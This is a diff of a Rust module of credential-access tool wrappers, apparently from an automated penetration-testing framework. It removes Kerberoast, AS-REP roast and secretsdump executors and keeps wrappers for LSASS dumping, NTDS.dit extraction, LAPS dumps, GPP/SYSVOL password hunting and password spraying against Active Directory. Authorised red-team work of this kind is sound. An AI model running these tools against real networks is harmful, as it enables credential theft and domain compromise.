@@ -1,124 +1,14 @@
-//! Credential access tool executors.
-//!
-//! Each function takes a JSON `Value` of arguments and returns a `ToolOutput`
-//! produced by running the corresponding CLI tool as a subprocess.
+//! Miscellaneous credential access tool executors (lsassy, domain admin
+//! checker, GPP, SYSVOL, LAPS, LDAP descriptions, SMB spider, NTDS,
+//! password policy, password spray, username-as-password, credman, autologon).
 
 use anyhow::Result;
 use serde_json::Value;
 
-use crate::args::{optional_bool, optional_i64, optional_str, required_str};
+use crate::args::{optional_i64, optional_str, required_str};
 use crate::credentials;
 use crate::executor::CommandBuilder;
 use crate::ToolOutput;
-
-// ---------------------------------------------------------------------------
-// 1. Kerberoast
-// ---------------------------------------------------------------------------
-
-/// Request TGS tickets for SPNs via `impacket-GetUserSPNs`.
-pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
-    let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
-    let dc_ip = required_str(args, "dc_ip")?;
-
-    let target = format!("{domain}/{username}:{password}");
-
-    CommandBuilder::new("impacket-GetUserSPNs")
-        .arg(&target)
-        .flag("-dc-ip", dc_ip)
-        .arg("-request")
-        .timeout_secs(60)
-        .execute()
-        .await
-}
-
-// ---------------------------------------------------------------------------
-// 2. AS-REP Roast
-// ---------------------------------------------------------------------------
-
-/// Request AS-REP hashes for accounts without pre-auth via `impacket-GetNPUsers`.
-pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
-    let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
-    let dc_ip = required_str(args, "dc_ip")?;
-
-    let target = format!("{domain}/{username}:{password}");
-
-    CommandBuilder::new("impacket-GetNPUsers")
-        .arg(&target)
-        .flag("-dc-ip", dc_ip)
-        .arg("-request")
-        .timeout_secs(60)
-        .execute()
-        .await
-}
-
-// ---------------------------------------------------------------------------
-// 3. Kerberos user enumeration (no auth)
-// ---------------------------------------------------------------------------
-
-/// Enumerate valid usernames via Kerberos pre-auth without credentials.
-pub async fn kerberos_user_enum_noauth(args: &Value) -> Result<ToolOutput> {
-    let domain = required_str(args, "domain")?;
-    let users_file = required_str(args, "users_file")?;
-    let dc_ip = required_str(args, "dc_ip")?;
-
-    let target = format!("{domain}/");
-
-    CommandBuilder::new("impacket-GetNPUsers")
-        .arg(&target)
-        .flag("-usersfile", users_file)
-        .flag("-dc-ip", dc_ip)
-        .arg("-no-pass")
-        .timeout_secs(180)
-        .execute()
-        .await
-}
-
-// ---------------------------------------------------------------------------
-// 4. Secretsdump
-// ---------------------------------------------------------------------------
-
-/// Dump secrets via `impacket-secretsdump` with password, hash, or Kerberos auth.
-pub async fn secretsdump(args: &Value) -> Result<ToolOutput> {
-    let domain = optional_str(args, "domain");
-    let username = required_str(args, "username")?;
-    let password = optional_str(args, "password");
-    let hash = optional_str(args, "hash");
-    let target = required_str(args, "target")?;
-    let dc_ip = optional_str(args, "dc_ip");
-    let use_kerberos = optional_bool(args, "use_kerberos").unwrap_or(false);
-    let ticket_path = optional_str(args, "ticket_path");
-    let timeout_minutes = optional_i64(args, "timeout_minutes");
-
-    let timeout_secs = timeout_minutes.map(|m| (m * 60) as u64).unwrap_or(180);
-
-    let (auth_string, extra_args) =
-        credentials::impacket_auth(domain, username, password, hash, target);
-
-    let mut cmd = CommandBuilder::new("impacket-secretsdump");
-
-    cmd = cmd.flag_opt("-dc-ip", dc_ip);
-
-    if use_kerberos {
-        cmd = cmd.arg("-k").arg("-no-pass");
-        if let Some(tp) = ticket_path {
-            cmd = cmd.env("KRB5CCNAME", tp);
-        }
-    } else {
-        cmd = cmd.args(extra_args);
-    }
-
-    cmd = cmd.arg(&auth_string);
-
-    cmd.timeout_secs(timeout_secs).execute().await
-}
-
-// ---------------------------------------------------------------------------
-// 5. Lsassy
-// ---------------------------------------------------------------------------
 
 /// Dump LSASS credentials remotely via `lsassy`.
 pub async fn lsassy(args: &Value) -> Result<ToolOutput> {
@@ -150,10 +40,6 @@ pub async fn lsassy(args: &Value) -> Result<ToolOutput> {
     cmd.timeout_secs(120).execute().await
 }
 
-// ---------------------------------------------------------------------------
-// 6. Domain admin checker
-// ---------------------------------------------------------------------------
-
 /// Check for admin access on targets via `netexec smb --admin-status`.
 pub async fn domain_admin_checker(args: &Value) -> Result<ToolOutput> {
     let targets = required_str(args, "targets")?;
@@ -174,10 +60,6 @@ pub async fn domain_admin_checker(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-// ---------------------------------------------------------------------------
-// 7. GPP password finder
-// ---------------------------------------------------------------------------
-
 /// Search for Group Policy Preferences passwords via `netexec smb -M gpp_autologin`.
 pub async fn gpp_password_finder(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
@@ -196,10 +78,6 @@ pub async fn gpp_password_finder(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await
 }
-
-// ---------------------------------------------------------------------------
-// 8. SYSVOL script search
-// ---------------------------------------------------------------------------
 
 /// Spider SYSVOL for scripts and config files via `netexec smb -M spider_plus`.
 pub async fn sysvol_script_search(args: &Value) -> Result<ToolOutput> {
@@ -221,10 +99,6 @@ pub async fn sysvol_script_search(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-// ---------------------------------------------------------------------------
-// 9. LAPS dump
-// ---------------------------------------------------------------------------
-
 /// Dump LAPS passwords via `netexec ldap -M laps`.
 pub async fn laps_dump(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
@@ -243,10 +117,6 @@ pub async fn laps_dump(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await
 }
-
-// ---------------------------------------------------------------------------
-// 10. LDAP search descriptions
-// ---------------------------------------------------------------------------
 
 /// Search for user descriptions containing credentials via `ldapsearch`.
 pub async fn ldap_search_descriptions(args: &Value) -> Result<ToolOutput> {
@@ -284,10 +154,6 @@ pub async fn ldap_search_descriptions(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-// ---------------------------------------------------------------------------
-// 11. SMB client spider
-// ---------------------------------------------------------------------------
-
 /// Spider SMB shares for interesting files via `netexec smb -M spider_plus`.
 pub async fn smbclient_spider(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
@@ -318,10 +184,6 @@ pub async fn smbclient_spider(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-// ---------------------------------------------------------------------------
-// 12. NTDS.dit extract
-// ---------------------------------------------------------------------------
-
 /// Extract NTDS.dit secrets via `impacket-secretsdump -ntds drsuapi`.
 pub async fn ntds_dit_extract(args: &Value) -> Result<ToolOutput> {
     let domain = optional_str(args, "domain");
@@ -343,10 +205,6 @@ pub async fn ntds_dit_extract(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-// ---------------------------------------------------------------------------
-// 13. Password policy
-// ---------------------------------------------------------------------------
-
 /// Retrieve the domain password policy via `netexec smb --pass-pol`.
 pub async fn password_policy(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
@@ -365,10 +223,6 @@ pub async fn password_policy(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await
 }
-
-// ---------------------------------------------------------------------------
-// 14. Password spray
-// ---------------------------------------------------------------------------
 
 /// Spray a single password across a user list via `netexec smb`.
 pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
@@ -392,10 +246,6 @@ pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-// ---------------------------------------------------------------------------
-// 15. Username as password
-// ---------------------------------------------------------------------------
-
 /// Test each username as its own password via `netexec smb --no-bruteforce`.
 pub async fn username_as_password(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
@@ -415,10 +265,6 @@ pub async fn username_as_password(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-// ---------------------------------------------------------------------------
-// 16. Check Credential Manager entries
-// ---------------------------------------------------------------------------
-
 /// Enumerate Credential Manager / Chrome entries via `netexec smb -M enum_chrome`.
 pub async fn check_credman_entries(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
@@ -437,10 +283,6 @@ pub async fn check_credman_entries(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await
 }
-
-// ---------------------------------------------------------------------------
-// 17. Check autologon registry
-// ---------------------------------------------------------------------------
 
 /// Query Winlogon autologon registry values via `netexec smb -M reg-query`.
 pub async fn check_autologon_registry(args: &Value) -> Result<ToolOutput> {
@@ -463,67 +305,4 @@ pub async fn check_autologon_registry(args: &Value) -> Result<ToolOutput> {
         .timeout_secs(120)
         .execute()
         .await
-}
-
-// ---------------------------------------------------------------------------
-// Tests
-// ---------------------------------------------------------------------------
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-    use serde_json::json;
-
-    /// Verify that the base_dn builder produces correct LDAP distinguished names.
-    #[test]
-    fn test_base_dn_from_domain() {
-        let domain = "contoso.local";
-        let dn: String = domain
-            .split('.')
-            .map(|p| format!("DC={p}"))
-            .collect::<Vec<_>>()
-            .join(",");
-        assert_eq!(dn, "DC=contoso,DC=local");
-    }
-
-    /// Verify that the base_dn builder handles a deeper domain.
-    #[test]
-    fn test_base_dn_from_child_domain() {
-        let domain = "north.sevenkingdoms.local";
-        let dn: String = domain
-            .split('.')
-            .map(|p| format!("DC={p}"))
-            .collect::<Vec<_>>()
-            .join(",");
-        assert_eq!(dn, "DC=north,DC=sevenkingdoms,DC=local");
-    }
-
-    /// Verify password_spray builds args for jitter correctly (presence only).
-    #[test]
-    fn test_password_spray_args_shape() {
-        // We can't fully execute without the binary, but we can verify
-        // the required_str / optional helpers parse correctly.
-        let args = json!({
-            "target": "192.168.58.10",
-            "users_file": "/tmp/users.txt",
-            "password": "Welcome1",
-            "domain": "contoso.local",
-            "delay_seconds": 5
-        });
-        assert_eq!(required_str(&args, "target").unwrap(), "192.168.58.10");
-        assert_eq!(optional_i64(&args, "delay_seconds"), Some(5));
-    }
-
-    /// Verify username_as_password parses required fields.
-    #[test]
-    fn test_username_as_password_args() {
-        let args = json!({
-            "target": "192.168.58.10",
-            "users_file": "/tmp/users.txt",
-            "domain": "contoso.local"
-        });
-        assert!(required_str(&args, "target").is_ok());
-        assert!(required_str(&args, "users_file").is_ok());
-        assert!(required_str(&args, "domain").is_ok());
-    }
 }
